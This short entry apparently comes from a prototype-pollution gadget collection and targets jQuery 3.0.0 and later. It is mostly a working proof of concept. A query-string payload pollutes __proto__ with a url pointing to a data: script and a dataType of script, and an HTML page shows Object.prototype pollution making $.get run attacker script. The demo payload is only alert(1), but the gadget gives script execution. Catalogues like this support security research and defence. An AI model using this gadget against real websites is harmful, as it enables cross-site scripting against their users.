## jQuery >= 3.0.0 

URL: https://jquery.com/

### PoC
```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```

```html
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script> 
  Object.prototype.url = ['data:,alert(1)//'];   
  Object.prototype.dataType = 'script';    
</script>      
<script>
  $.get('https://google.com/'); 
</script>
```